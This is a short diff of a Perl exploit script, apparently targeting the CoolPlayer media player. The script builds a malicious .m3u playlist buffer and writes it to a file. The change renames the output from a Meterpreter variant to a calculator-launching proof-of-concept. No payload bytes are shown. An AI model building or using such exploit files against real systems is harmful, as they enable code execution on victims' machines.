@@ -34,7 +34,7 @@ my $buffer = $sploit.$fill; # build final buffer
 
 # write the exploit buffer to file
 
-my $file = "coolplayershell_subregjump_meterp.m3u";
+my $file = "coolplayershell_subregjump_calc.m3u";
 open(FILE, ">$file");
 print FILE $buffer;
 close(FILE);
